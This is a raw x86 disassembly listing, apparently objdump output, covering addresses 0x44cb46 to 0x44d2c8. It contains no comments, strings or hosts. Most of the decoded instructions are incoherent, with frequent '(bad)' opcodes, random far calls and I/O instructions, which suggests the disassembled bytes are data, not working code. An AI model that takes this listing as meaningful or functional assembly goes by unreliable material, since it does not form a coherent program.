  44cb46:	add    BYTE PTR [eax],al
  44cb48:	add    BYTE PTR [eax],al
  44cb4a:	add    BYTE PTR [edi-0x60d73c56],ah
  44cb50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44cb51:	ret    
  44cb52:	sub    eax,0x42c56497
  44cb57:	(bad)  
  44cb58:	adc    ebp,eax
  44cb5a:	add    DWORD PTR [edi+0x7f8bc3d9],0x31
  44cb61:	les    edx,FWORD PTR [ebx-0x643c1689]
  44cb67:	outs   dx,DWORD PTR ds:[esi]
  44cb68:	icebp  
  44cb69:	ret    
  44cb6a:	mov    ds:0xabc39967,eax
  44cb6f:	pop    edi
  44cb70:	icebp  
  44cb71:	ret    
  44cb72:	mov    bl,0x57
  44cb74:	mov    ebx,eax
  44cb76:	retf   0xb9cf
  44cb79:	ret    
  44cb7a:	loope  0x44cb43
  44cb7c:	ja     0x44cb43
  44cb7e:	stc    
  44cb7f:	mov    edi,0x9001cc4b
  44cb84:	addr16 or al,0x0
  44cb87:	nop
  44cb88:	push   ebx
  44cb89:	mov    esp,0xc2efa005
  44cb8e:	test   BYTE PTR [eax-0x5f63442e],ah
  44cb94:	xor    BYTE PTR [edx+edi*4-0x2743ec80],bh
  44cb9b:	xor    BYTE PTR [edx-0x5cd32c66],0xf6
  44cba2:	aam    0x8a
  44cba4:	mov    ds:0xa387d4e6,eax
  44cba9:	call   esp
  44cbab:	mov    ds:0xd451a3,eax
  44cbb0:	add    BYTE PTR [eax],al
  44cbb2:	add    BYTE PTR [eax],al
  44cbb4:	inc    ecx
  44cbb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44cbb6:	xchg   ebp,eax
  44cbb7:	aam    0x27
  44cbb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44cbba:	into   
  44cbbb:	aad    0x87
  44cbbd:	mov    al,ds:0xa14bd537
  44cbc2:	inc    edx
  44cbc3:	aad    0x3b
  44cbc5:	mov    ds:0x9f8bd648,al
  44cbca:	xchg   edi,eax
  44cbcb:	sar    BYTE PTR ds:0x45d1b1a0,1
  44cbd1:	pushf  
  44cbd2:	pop    edx
  44cbd3:	sar    DWORD PTR [edi-0x63],1
  44cbd6:	in     al,0xd2
  44cbd8:	push   eax
  44cbd9:	popf   
  44cbda:	mov    eax,0x9d9d65d2
  44cbdf:	sar    ch,cl
  44cbe1:	popf   
  44cbe2:	push   ecx
  44cbe3:	rcl    BYTE PTR [ebx+0x45dbc59a],cl
  44cbe9:	call   0xdb31:0x9afbdb4b
  44cbf0:	nop
  44cbf1:	fwait
  44cbf2:	test   ah,bl
  44cbf4:	sub    bl,BYTE PTR [ebx-0x677723a1]
  44cbfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44cbfb:	fld    QWORD PTR [ecx+ebx*4]
  44cbfe:	(bad)
  44cc01:	cdq    
  44cc02:	inc    edx
  44cc03:	fld    QWORD PTR [edx]
  44cc05:	call   0xdd5f:0x9905dd77
  44cc0c:	sub    bl,BYTE PTR [ecx-0x66a5224d]
  44cc12:	scas   al,BYTE PTR es:[edi]
  44cc13:	fnstsw WORD PTR [edi]
  44cc15:	cdq    
  44cc16:	mov    ebp,0xdd
  44cc1b:	add    BYTE PTR [eax],al
  44cc1d:	push   edi
  44cc1e:	cdq    
  44cc1f:	push   cs
  44cc20:	fisub  WORD PTR [edi-0x75]
  44cc23:	sub    bh,dl
  44cc25:	pop    edi
  44cc26:	call   0x372a:0xe558282a
  44cc2d:	pop    eax
  44cc2e:	add    DWORD PTR [ebx],ebp
  44cc30:	or     cl,BYTE PTR [eax+0x2f]
  44cc33:	sub    ebp,DWORD PTR [ebp+0x48]
  44cc36:	adc    ebp,DWORD PTR [ebx]
  44cc38:	push   ebp
  44cc39:	cmp    BYTE PTR [edi],al
  44cc3b:	sub    esi,DWORD PTR [edx-0x6ed47dc8]
  44cc41:	call   0xe8c5f797
  44cc46:	popa   
  44cc47:	sub    ebp,edx
  44cc49:	out    0xaa,al
  44cc4b:	sub    edi,ebp
  44cc4d:	fisub  WORD PTR [ebp-0x78390cd7]
  44cc53:	sub    DWORD PTR [edi+edi*4-0x38d1d5e3],edx
  44cc5a:	imul   ebp,DWORD PTR [edx],0xfffffff1
  44cc5d:	mov    ecx,0xe9d328a4
  44cc62:	xchg   edx,eax
  44cc63:	sub    BYTE PTR [edi-0x16],bh
  44cc66:	loop   0x44cc8f
  44cc68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44cc69:	fcomp  DWORD PTR [ebx]
  44cc6b:	sub    BYTE PTR [edx],dl
  44cc6d:	fst    DWORD PTR [eax+ebp*8-0x17]
  44cc71:	jecxz  0x44cc25
  44cc73:	push   cs
  44cc74:	mov    DWORD PTR [ebx-0x3c52f14e],edx
  44cc7a:	call   FWORD PTR [esi]
  44cc7c:	push   0xffffffbc
  44cc7e:	cs pop ds
  44cc80:	push   ebp
  44cc81:	add    BYTE PTR [eax],al
  44cc83:	add    BYTE PTR [eax],al
  44cc85:	add    BYTE PTR [eax+ecx*1+0x1f],ah
  44cc89:	adc    BYTE PTR [esi+ecx*2+0x1f],bl
  44cc8d:	sbb    esp,DWORD PTR [ebx-0x63]
  44cc90:	sbb    eax,0x1e11627a
  44cc95:	enter  0xb42,0x1d
  44cc99:	pop    ds
  44cc9a:	cmp    eax,0x55001c0c
  44cc9f:	jg     0x44ccbd
  44cca1:	xor    eax,0x363b64e5
  44cca6:	retf   
  44cca7:	sub    BYTE PTR [edx-0x67ca4c9],0x37
  44ccae:	mov    ebx,0x42394b77
  44ccb3:	jbe    0x44ccb9
  44ccb5:	cmp    ch,ah
  44ccb7:	jnp    0x44cc83
  44ccb9:	cmp    al,0x53
  44ccbb:	jge    0x44cce0
  44ccbd:	cmp    eax,0x3d887d18
  44ccc2:	jmp    0x44cd40
  44ccc4:	or     bh,BYTE PTR [esi]
  44ccc6:	dec    eax
  44ccc7:	jp     0x44cc67
  44ccc9:	ds jl  0x44cd45
  44cccc:	cmp    bh,BYTE PTR [edi]
  44ccce:	or     edi,DWORD PTR [ebx-0x28]
  44ccd1:	aas    
  44ccd2:	mov    edi,0xf93ff07a
  44ccd7:	femms  
  44ccd9:	add    BYTE PTR [ebp-0x51],ah
  44ccdc:	push   cs
  44ccdd:	add    BYTE PTR [edi-0x21d00381],bh
  44cce3:	jg     0x44cd2e
  44cce5:	xor    BYTE PTR [esi],bh
  44cce7:	jg     0x44cc9f
  44cce9:	xor    BYTE PTR [eax],al
  44cceb:	add    BYTE PTR [eax],al
  44cced:	add    BYTE PTR [eax],al
  44ccef:	ds jg  0x44cce6
  44ccf2:	xor    BYTE PTR [edi-0x2ccea880],bh
  44ccf8:	sbb    BYTE PTR [esi+0x31],0x21
  44ccfc:	adc    al,0x31
  44ccff:	mov    eax,0x4932487d
  44cd04:	jge    0x44ccba
  44cd06:	xor    dh,BYTE PTR [ecx+0x7d]
  44cd09:	icebp  
  44cd0a:	xor    dh,BYTE PTR ds:0xbc33907e
  44cd10:	jle    0x44ccf2
  44cd12:	xor    ecx,DWORD PTR [edx+eax*4-0x7d64cbcb]
  44cd19:	and    BYTE PTR [eax+edx*4],dh
  44cd1c:	mov    esi,0x799c4abe
  44cd21:	mov    edi,0xbdeba4ed
  44cd26:	xchg   DWORD PTR [ebp-0x7a4a4229],ebx
  44cd2c:	or     al,0xbe
  44cd2e:	int    0x7d
  44cd30:	je     0x44cd0c
  44cd32:	or     al,0x86
  44cd34:	arpl   dx,bx
  44cd36:	cmp    al,0x7e
  44cd38:	repnz fsub DWORD PTR [edi+0x66]
  44cd3c:	mov    bl,0xd8
  44cd3e:	mov    ebx,DWORD PTR [esi-0x19]
  44cd41:	fadd   st,st(2)
  44cd43:	data16 (bad) 
  44cd45:	fcom   DWORD PTR [eax]
  44cd47:	pop    edi
  44cd48:	push   ecx
  44cd49:	fst    DWORD PTR [esi]
  44cd4b:	(bad)  
  44cd4c:	arpl   cx,bx
  44cd4e:	sub    eax,0x43d78ebf
  44cd53:	add    BYTE PTR [eax],al
  44cd55:	add    BYTE PTR [eax],al
  44cd57:	add    bh,al
  44cd59:	imul   ebx,ecx,0xc44cbfdd
  44cd5f:	sub    ebp,DWORD PTR [eax-0x575134d1]
  44cd65:	jmp    0x89cb:0x4798faca
  44cd6c:	cdq    
  44cd6d:	inc    eax
  44cd6e:	retf   0x89d7
  44cd71:	push   es
  44cd72:	mov    BYTE PTR [eax],0x8b
  44cd75:	inc    ebp
  44cd76:	lds    ebp,FWORD PTR [edi+0x7b]
  44cd79:	das    
  44cd7a:	les    edx,FWORD PTR ds:0x76c07974
  44cd80:	ins    BYTE PTR es:[edi],dx
  44cd81:	fcmovb st,st(6)
  44cd83:	shl    DWORD PTR [edi+eiz*4-0x3a],cl
  44cd87:	xor    bl,BYTE PTR [edi+0x3c]
  44cd8a:	shl    DWORD PTR [edi+0x17c4957],0x90
  44cd91:	retf   
  44cd92:	or     eax,DWORD PTR [eax]
  44cd94:	nop
  44cd95:	adc    eax,0xb2c094bc
  44cd9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44cd9b:	rcr    edx,cl
  44cd9d:	sub    DWORD PTR [ecx-0x2c],0x79
  44cda1:	test   BYTE PTR [edx+edx*8],cl
  44cda4:	mov    edi,0x59d1d084
  44cda9:	test   DWORD PTR [ecx],edi
  44cdab:	rol    DWORD PTR [ebp-0x7a],cl
  44cdae:	jmp    0x44cd7f
  44cdb0:	xchg   BYTE PTR [esi-0x78fa2fac],al
  44cdb6:	hlt    
  44cdb7:	shl    BYTE PTR [eax-0x79],1
  44cdba:	mov    edi,0xd0
  44cdbf:	add    BYTE PTR [eax],al
  44cdc1:	fiadd  WORD PTR [edi-0x77a22f9f]
  44cdc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44cdc8:	int    0x35
  44cdca:	mov    DWORD PTR [edi-0x32],esi
  44cdcd:	xchg   esi,eax
  44cdce:	mov    ch,BYTE PTR [eax-0x5c74bb25]
  44cdd4:	fcom   QWORD PTR [ecx-0x75]
  44cdd7:	out    0xdc,eax
  44cdd9:	or     ecx,DWORD PTR [edi+edx*8-0x2573a827]
  44cde0:	fldenv [ebp-0x74]
  44cde3:	(bad)  
  44cde4:	fnstenv ds:0x6bdabf8d
  44cdea:	lea    eax,[edi-0x26]
  44cded:	aad    0x8d
  44cdef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44cdf0:	xlat   BYTE PTR ds:[ebx]
  44cdf1:	ror    BYTE PTR [edi-0x6f8427ae],1
  44cdf7:	xchg   ch,dl
  44cdf9:	cmc    
  44cdfa:	nop
  44cdfb:	aad    0xd6
  44cdfd:	adc    dl,BYTE PTR [edx-0x6e1229a7]
  44ce03:	cmc    
  44ce04:	adc    DWORD PTR [edx-0x6ffc8e4e],0xffffffb2
  44ce0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44ce0c:	rol    DWORD PTR [edi],cl
  44ce0e:	and    DWORD PTR [ebx],0xffffffd3
  44ce11:	test   eax,0xd3d44782
  44ce16:	test   BYTE PTR [esi],cl
  44ce18:	mul    BYTE PTR [eax-0x6]
  44ce1b:	sbb    ecx,DWORD PTR [edi+0x691bc962]
  44ce21:	popa   
  44ce22:	iret   
  44ce23:	sbb    esi,eax
  44ce25:	add    BYTE PTR [eax],al
  44ce27:	add    BYTE PTR [eax],al
  44ce29:	add    BYTE PTR [edi-0xb],bl
  44ce2c:	and    cl,BYTE PTR [esi+0x40]
  44ce2f:	(bad)  
  44ce30:	and    ah,BYTE PTR [ecx+0x40]
  44ce33:	sbb    esp,DWORD PTR [ebx]
  44ce35:	int3   
  44ce36:	inc    eax
  44ce37:	push   eax
  44ce38:	and    edx,esi
  44ce3a:	pop    esi
  44ce3b:	pushf  
  44ce3c:	and    DWORD PTR [edx+0x57],ebp
  44ce3f:	sbb    esp,DWORD PTR [edx]
  44ce41:	leave  
  44ce42:	dec    edi
  44ce43:	push   ss
  44ce44:	and    DWORD PTR [ebx+0x46],esp
  44ce47:	jns    0x44ce6a
  44ce49:	leave  
  44ce4a:	pop    esp
  44ce4b:	scas   eax,DWORD PTR es:[edi]
  44ce4c:	pop    ds
  44ce4d:	fist   DWORD PTR [ecx+ecx*4+0x1f]
  44ce51:	push   es
  44ce52:	dec    ebp
  44ce53:	(bad)  
  44ce54:	pop    ds
  44ce55:	add    BYTE PTR [ebp-0x38],al
  44ce58:	pop    ds
  44ce59:	pusha  
  44ce5a:	frstor [edi]
  44ce5c:	and    BYTE PTR [ecx],bh
  44ce5e:	aad    0x1e
  44ce60:	and    BYTE PTR [ebp+0xf207acd],ah
  44ce66:	aam    0xff
  44ce68:	es xchg edi,eax
  44ce6a:	int3   
  44ce6b:	pop    eax
  44ce6c:	daa    
  44ce6d:	push   ebx
  44ce6e:	les    esi,FWORD PTR [ebx-0x48451cdb]
  44ce74:	and    eax,0x2592bae0
  44ce79:	pop    es
  44ce7a:	jmp    0x44ce17
  44ce7c:	and    eax,0x25d4eafb
  44ce81:	jne    0x44ce5e
  44ce83:	test   eax,0x6ada5424
  44ce88:	and    eax,0x2426c8fb
  44ce8d:	mov    esi,0x0
  44ce92:	add    BYTE PTR [edi-0x3ae3d6f8],bh
  44ce98:	push   eax
  44ce99:	call   0xd09779e
  44ce9e:	add    BYTE PTR [ecx],ah
  44cea0:	mov    ah,0xe
  44cea2:	add    dh,al
  44cea4:	data16 cld 
  44cea6:	xor    BYTE PTR [eiz*2+0x64fa318c],bh
  44cead:	test   DWORD PTR [ecx],esi
  44ceaf:	sub    ah,BYTE PTR [ebp+0x1a]
  44ceb2:	xor    dh,BYTE PTR [ebx-0x53cda59c]
  44ceb8:	fs ins DWORD PTR es:[edi],dx
  44ceba:	xor    dl,BYTE PTR [esp+eiz*2+0x61ba325c]
  44cec1:	xchg   edi,eax
  44cec2:	xor    ch,BYTE PTR [esi-0x53cd649f]
  44cec8:	popa   
  44cec9:	int3   
  44ceca:	xor    bh,dl
  44cecc:	popa   
  44cecd:	(bad)  
  44cece:	xor    al,BYTE PTR [edx]
  44ced0:	(bad)  
  44ced1:	fidiv  WORD PTR [edx]
  44ced3:	add    esp,DWORD PTR [edx+0x4e]
  44ced6:	xor    edx,DWORD PTR [ebp+0x59338b61]
  44cedc:	(bad)  
  44cedd:	stc    
  44cede:	xor    eax,ecx
  44cee0:	(bad)  
  44cee1:	shl    BYTE PTR [esi+eiz*1],1
  44cee4:	cmp    BYTE PTR ds:0x9b7dff36,0x36
  44ceeb:	add    BYTE PTR [edi+0x1e],bh
  44ceee:	aaa    
  44ceef:	sar    DWORD PTR [esi+0x14],cl
  44cef2:	cmp    BYTE PTR [ebx+ebp*2+0x3990],bl
  44cef9:	add    BYTE PTR [eax],al
  44cefb:	add    BYTE PTR [edx-0x79c57b94],al
  44cf01:	imul   eax,edi,0xf665443b
  44cf07:	aas    
  44cf08:	mov    ecx,0x59000cd3
  44cf0d:	mov    bl,0xe
  44cf0f:	add    dl,ah
  44cf11:	arpl   WORD PTR [esi],sp
  44cf13:	xor    bl,ah
  44cf15:	arpl   WORD PTR [edx+0x30],ax
  44cf18:	nop
  44cf19:	sub    eax,0x8b6089bc
  44cf1e:	mov    ebx,0xbd7760fc
  44cf23:	dec    ecx
  44cf24:	shl    DWORD PTR [esi],0xbd
  44cf27:	outs   dx,BYTE PTR ds:[esi]
  44cf28:	ror    DWORD PTR [edx+0x3fc214bc],0xbe
  44cf2f:	jne    0x44cef3
  44cf31:	sub    cl,al
  44cf33:	sbb    eax,0xdebf8ea3
  44cf38:	mov    ds:0xa501c77d,eax
  44cf3d:	test   ah,al
  44cf3f:	scas   al,BYTE PTR es:[edi]
  44cf40:	sahf   
  44cf41:	push   esi
  44cf42:	lds    esp,FWORD PTR [edx-0x79]
  44cf45:	ret    0x95c3
  44cf48:	jg     0x44cf1d
  44cf4a:	fidiv  DWORD PTR [ecx-0x5724a588]
  44cf50:	jns    0x44cf5e
  44cf52:	(bad)  
  44cf54:	imul   ecx,DWORD PTR [edx+ebx*8+0x41],0x94d8cd6a
  44cf5c:	pop    edx
  44cf5d:	mov    ah,0xd7
  44cf5f:	mov    BYTE PTR [eax],0x0
  44cf62:	add    BYTE PTR [eax],al
  44cf64:	add    BYTE PTR [ebx+0x5f],bl
  44cf67:	fsubr  DWORD PTR ds:0xb7befecc
  44cf6d:	les    ebx,FWORD PTR [eax]
  44cf6f:	mov    edi,0xbf6fbcee
  44cf74:	int3   
  44cf75:	mov    ch,0xe6
  44cf77:	mov    ebp,0xbe73ae40
  44cf7c:	mov    ah,0xa6
  44cf7e:	mov    edi,DWORD PTR [edi+edx*8-0x1c430762]
  44cf85:	xchg   esi,eax
  44cf86:	(bad)  
  44cf87:	mov    esp,0xbd5a8efa
  44cf8c:	or     DWORD PTR [edi+0x7f22bd6f],eax
  44cf92:	dec    ecx
  44cf93:	mov    ebp,0xd1b2774a
  44cf98:	ror    BYTE PTR [esi-0x71],cl
  44cf9b:	xchg   edx,edx
  44cf9d:	mov    esp,0x9253f58e
  44cfa2:	mov    dl,0xed
  44cfa4:	add    al,0x90
  44cfa6:	mov    dl,0xe1
  44cfa8:	shl    DWORD PTR [eax-0x392c2f7e],cl
  44cfae:	and    BYTE PTR [eax-0x2d],0x42
  44cfb2:	sub    DWORD PTR ds:0x308379d4,0xffffffd5
  44cfb9:	or     DWORD PTR [ecx-0x7edc2a7c],eax
  44cfbf:	sbb    edi,edx
  44cfc1:	mov    ah,0x81
  44cfc3:	sti    
  44cfc4:	(bad)  
  44cfc5:	iret   
  44cfc6:	add    DWORD PTR [ebx],0xd7
  44cfcc:	add    BYTE PTR [eax],al
  44cfce:	mov    ah,0x81
  44cfd0:	pop    ds
  44cfd1:	xlat   BYTE PTR ds:[ebx]
  44cfd2:	lds    eax,FWORD PTR [ecx-0x7e15296a]
  44cfd8:	test   esi,edx
  44cfda:	pop    esi
  44cfdb:	cmp    BYTE PTR [ebp-0x2a],0x35
  44cfdf:	add    BYTE PTR [eax-0x67de22a],0xd7
  44cfe6:	lea    eax,[esi-0x798f2806]
  44cfec:	mov    ebp,0xb8655d7
  44cff1:	fadd   DWORD PTR [edi+0x16d76d86]
  44cff7:	xchg   DWORD PTR [edx-0x29],eax
  44cffa:	push   ss
  44cffb:	xchg   DWORD PTR [edi-0x29],edi
  44cffe:	and    DWORD PTR [edi-0x790f2852],eax
  44d004:	dec    edx
  44d005:	xlat   BYTE PTR ds:[ebx]
  44d006:	add    al,0x88
  44d008:	xor    al,bl
  44d00a:	mov    esp,0x9fd82687
  44d00f:	test   dh,ch
  44d011:	fnstenv [ebx-0x7c]
  44d014:	push   cs
  44d015:	scas   eax,DWORD PTR es:[edi]
  44d016:	fldlg2 
  44d018:	and    BYTE PTR [ebp-0x27],bh
  44d01b:	push   edx
  44d01c:	and    DWORD PTR [edx-0x7de02036],ecx
  44d022:	retf   0x2017
  44d025:	and    DWORD PTR [edx-0x3435d947],edi
  44d02b:	call   0x1227:0x795baa26
  44d032:	add    BYTE PTR [eax],al
  44d034:	add    BYTE PTR [eax],al
  44d036:	add    BYTE PTR [ebx+0x4a],bl
  44d039:	daa    
  44d03a:	loopne 0x44d088
  44d03c:	or     ah,BYTE PTR [esi]
  44d03e:	fld    DWORD PTR [ebp-0x6d]
  44d041:	and    al,0x12
  44d043:	pop    esi
  44d044:	and    BYTE PTR [ebx+eax*2],0x56
  44d048:	ret    
  44d049:	and    al,0x50
  44d04b:	dec    esi
  44d04c:	int    0x24
  44d04e:	ins    DWORD PTR es:[edi],dx
  44d04f:	inc    esi
  44d050:	jbe    0x44d077
  44d052:	minps  xmm7,xmm6
  44d055:	and    ecx,DWORD PTR [ebp+0x55]
  44d058:	sbb    BYTE PTR [edx+edi*4],ah
  44d05b:	dec    ebp
  44d05c:	mov    ecx,0xc447f92a
  44d061:	sub    al,BYTE PTR [edi-0x37d49fc0]
  44d067:	push   esi
  44d068:	cdq    
  44d069:	sub    DWORD PTR ds:0x452a3c4f,ebx
  44d06f:	inc    edi
  44d070:	add    ebp,DWORD PTR [edx]
  44d072:	inc    eax
  44d073:	fild   WORD PTR [ebx]
  44d075:	sub    bl,BYTE PTR [eax-0x6ad59b29]
  44d07b:	iret   
  44d07c:	dec    edi
  44d07d:	sub    bh,BYTE PTR [ecx-0x39]
  44d080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d081:	sub    BYTE PTR [esi-0x34d70a3f],ch
  44d087:	rcr    esp,0x28
  44d08a:	faddp  st(1),st
  44d08c:	lds    ebp,FWORD PTR [eax]
  44d08e:	pop    esi
  44d08f:	ret    0x293e
  44d092:	add    BYTE PTR [ebx],dh
  44d094:	pusha  
  44d095:	scas   eax,DWORD PTR es:[edi]
  44d096:	ds cmp eax,0x3eab60
  44d09c:	add    BYTE PTR [eax],al
  44d09e:	add    BYTE PTR [eax],al
  44d0a0:	push   esp
  44d0a1:	pusha  
  44d0a2:	pop    ds
  44d0a3:	aas    
  44d0a4:	in     eax,0x61
  44d0a6:	mov    DWORD PTR [edi],edi
  44d0a8:	xor    esp,DWORD PTR [ebx-0x29]
  44d0ab:	aas    
  44d0ac:	imul   esp,DWORD PTR [ebx-0x26],0xf163913f
  44d0b3:	aas    
  44d0b4:	jp     0x44d119
  44d0b6:	out    0x3f,al
  44d0b8:	jns    0x44d0aa
  44d0ba:	or     al,0x0
  44d0bc:	mov    ebp,0x61000eb6
  44d0c1:	pusha  
  44d0c2:	das    
  44d0c3:	xor    BYTE PTR [ecx+0x60],dl
  44d0c6:	sbb    al,0x30
  44d0c8:	mov    ds:0xd1303e66,al
  44d0cd:	data16 jbe 0x44d100
  44d0d0:	mov    eax,0xc5307b66
  44d0d5:	data16 xchg BYTE PTR [eax],dh
  44d0d8:	sbb    ah,BYTE PTR [eax-0x4a]
  44d0db:	xor    BYTE PTR [edx],dl
  44d0dd:	pusha  
  44d0de:	aad    0x30
  44d0e0:	sbb    esp,DWORD PTR [eax-0x40]
  44d0e3:	xor    BYTE PTR [ebx+0x60],dl
  44d0e6:	fbstp  TBYTE PTR [eax]
  44d0e8:	or     al,0x60
  44d0ea:	fdiv   QWORD PTR [eax]
  44d0ec:	cmp    esp,DWORD PTR [ecx+0x25]
  44d0ef:	xor    DWORD PTR [eax-0x20ce83a1],eax
  44d0f5:	pusha  
  44d0f6:	lock xor DWORD PTR [edi+0x5322160],ecx
  44d0fd:	data16 add al,0x33
  44d100:	mov    dh,0x65
  44d102:	pusha  
  44d103:	xor    eax,DWORD PTR [eax]
  44d105:	add    BYTE PTR [eax],al
  44d107:	add    BYTE PTR [eax],al
  44d109:	adc    eax,0xfc345167
  44d10e:	fs adc eax,0x6a69dc35
  44d114:	ss nop
  44d116:	inc    esi
  44d117:	(bad)  
  44d118:	push   esp
  44d119:	lahf   
  44d11a:	std    
  44d11b:	(bad)  
  44d11c:	push   ss
  44d11d:	mov    BYTE PTR [edx+0x6688ccda],ah
  44d123:	aad    0x40
  44d125:	jns    0x44d12e
  44d127:	aad    0x95
  44d129:	jns    0x44d12a
  44d12b:	fld    st(0)
  44d12d:	push   0x72
  44d12f:	fisttp DWORD PTR [ebx+ebp*2+0x5bd5dafd]
  44d136:	mov    bl,0xda
  44d138:	sbb    BYTE PTR [edi+esi*2-0x28],dl
  44d13c:	sub    ah,cl
  44d13e:	fadd   DWORD PTR fs:[eax-0x3c]
  44d142:	add    eax,ebx
  44d144:	dec    edi
  44d145:	mov    esp,0xb468d82b
  44d14a:	aam    0xd7
  44d14c:	test   BYTE PTR [ecx+ecx*2-0x5e5ae041],ch
  44d153:	mov    ebp,0xbdae9d26
  44d158:	dec    eax
  44d159:	xchg   ebp,eax
  44d15a:	mov    BYTE PTR [ebp-0x422c72a7],bh
  44d160:	rol    BYTE PTR [ebp+0x7e30da5a],1
  44d166:	(bad)  
  44d168:	or     BYTE PTR [edi+0x5f],dh
  44d16b:	fld    DWORD PTR [ebp+0x0]
  44d16e:	add    BYTE PTR [eax],al
  44d170:	add    BYTE PTR [eax],al
  44d172:	outs   dx,DWORD PTR ds:[esi]
  44d173:	xchg   ebx,eax
  44d174:	xlat   BYTE PTR ds:[ebx]
  44d175:	jmp    DWORD PTR [edi]
  44d177:	pop    ecx
  44d178:	sbb    al,0x2
  44d17a:	nop
  44d17b:	lds    edx,FWORD PTR [edx]
  44d17d:	add    BYTE PTR [eax-0x3d1d42e2],dl
  44d183:	mov    edx,0x7abc18bb
  44d188:	shl    BYTE PTR [ebx],0xc4
  44d18b:	xchg   edi,eax
  44d18c:	(bad)  
  44d18d:	adc    edi,DWORD PTR [ebp-0x5ace38f3]
  44d193:	mov    dl,0xc9
  44d195:	fsubr  DWORD PTR [ecx-0x7b]
  44d198:	push   ebp
  44d199:	(bad)  [edi+0x19d66884]
  44d19f:	test   al,dh
  44d1a1:	(bad)  
  44d1a2:	xchg   DWORD PTR [edx-0x7614337f],ecx
  44d1a8:	ret    
  44d1a9:	int3   
  44d1aa:	mov    cl,0x88
  44d1ac:	(bad)
  44d1af:	mov    BYTE PTR [edi-0x4777fb37],bl
  44d1b5:	retf   0x86da
  44d1b8:	sub    cl,bl
  44d1ba:	lahf   
  44d1bb:	xchg   cl,bl
  44d1bd:	iret   
  44d1be:	outs   dx,BYTE PTR ds:[esi]
  44d1bf:	mov    ds,eax
  44d1c1:	iret   
  44d1c2:	(bad)  
  44d1c3:	xchg   BYTE PTR [edi+0x6686e5cf],al
  44d1c9:	iret   
  44d1ca:	pop    edx
  44d1cb:	xchg   eax,ebp
  44d1cd:	iret   
  44d1ce:	mov    es,WORD PTR [edi-0x77ed2f35]
  44d1d4:	pop    esi
  44d1d5:	rol    BYTE PTR [eax],1
  44d1d7:	add    BYTE PTR [eax],al
  44d1d9:	add    BYTE PTR [eax],al
  44d1db:	or     eax,0x28d08d88
  44d1e0:	mov    BYTE PTR [esi-0x3e77bb30],dh
  44d1e6:	rcr    BYTE PTR [eax+0x7dcdfb88],1
  44d1ec:	mov    BYTE PTR [edx],cl
  44d1ee:	into   
  44d1ef:	mov    dh,0x88
  44d1f1:	ins    BYTE PTR es:[edi],dx
  44d1f2:	int    0x22
  44d1f4:	mov    DWORD PTR [edx-0x33],esp
  44d1f7:	push   ecx
  44d1f8:	mov    ebx,ecx
  44d1fa:	int    0x47
  44d1fc:	mov    DWORD PTR [eax-0xe76d333],edx
  44d202:	into   
  44d203:	or     DWORD PTR [ecx-0x7648312d],0x89bbcebf
  44d20d:	sub    ecx,edi
  44d20f:	jns    0x44d19a
  44d211:	push   cs
  44d212:	inc    esp
  44d213:	(bad)  
  44d214:	or     ebp,DWORD PTR [eax]
  44d216:	mov    ds,esi
  44d218:	inc    ebp
  44d219:	sub    cl,ch
  44d21b:	mov    bl,0xb4
  44d21d:	push   cs
  44d21e:	std    
  44d21f:	xchg   esp,eax
  44d220:	mov    dl,0xe
  44d222:	loopne 0x44d1e7
  44d224:	mov    ebp,0x87e4021e
  44d229:	push   ds
  44d22a:	cdq    
  44d22b:	jecxz  0x44d213
  44d22d:	push   ds
  44d22e:	shl    ebx,cl
  44d230:	les    ebx,FWORD PTR [esi]
  44d232:	imul   esp,ebx,0xc3581ec7
  44d238:	add    BYTE PTR [edi],bl
  44d23a:	inc    edx
  44d23b:	ret    
  44d23c:	push   edx
  44d23d:	pop    ds
  44d23e:	push   es
  44d23f:	add    BYTE PTR [eax],al
  44d241:	add    BYTE PTR [eax],al
  44d243:	add    bl,al
  44d245:	dec    esi
  44d246:	pop    ds
  44d247:	adc    eax,ebx
  44d249:	dec    eax
  44d24a:	pop    ds
  44d24b:	mul    BYTE PTR [ebp+eiz*4+0x1d]
  44d24f:	retf   
  44d250:	pop    esp
  44d251:	test   al,0x1d
  44d253:	stos   DWORD PTR es:[edi],eax
  44d254:	mov    BYTE PTR fs:0x1dd25c9b,bl
  44d25b:	xchg   DWORD PTR [ebp+ecx*8+0x1d],eax
  44d25f:	jae    0x44d2a4
  44d261:	cmp    eax,0xa943df1e
  44d266:	sbb    al,0xf
  44d268:	inc    edx
  44d269:	sbb    DWORD PTR [ecx+ebp*1],0x62
  44d26d:	fstp   QWORD PTR [eax+eax*2]
  44d270:	bound  ebp,QWORD PTR [ecx]
  44d272:	sbb    eax,0x1d0d6287
  44d277:	(bad)  
  44d278:	bound  ebx,QWORD PTR [ebp+0x1d]
  44d27b:	scas   eax,DWORD PTR es:[edi]
  44d27c:	inc    edx
  44d27d:	lahf   
  44d27e:	sbb    ecx,ebp
  44d280:	inc    eax
  44d281:	repnz sbb esp,DWORD PTR [esi]
  44d284:	inc    ecx
  44d285:	jmp    0xf1b:0xd6410b1b
  44d28c:	loope  0x44d2b6
  44d28e:	sbb    al,0x0
  44d290:	push   eax
  44d291:	arpl   WORD PTR [ecx+0xe631633],sp
  44d297:	xor    al,0xcc
  44d299:	pusha  
  44d29a:	mov    al,ds:0x69617934
  44d29f:	xor    eax,0x357d615c
  44d2a4:	mov    ch,0x61
  44d2a6:	pop    ds
  44d2a7:	add    BYTE PTR ss:[eax],al
  44d2aa:	add    BYTE PTR [eax],al
  44d2ac:	add    BYTE PTR [ebp+0x60],ah
  44d2af:	push   ds
  44d2b0:	aaa    
  44d2b1:	or     DWORD PTR [esi+0x46],ebx
  44d2b4:	aaa    
  44d2b5:	fistp  WORD PTR [ebp+0x7a]
  44d2b8:	aaa    
  44d2b9:	cld    
  44d2ba:	pop    ebp
  44d2bb:	xchg   edi,eax
  44d2bc:	aaa    
  44d2bd:	adc    DWORD PTR [edi-0x4c],ebx
  44d2c0:	aaa    
  44d2c1:	je     0x44d322
  44d2c3:	mov    edi,0xf45f9a37
  44d2c8:	aaa    
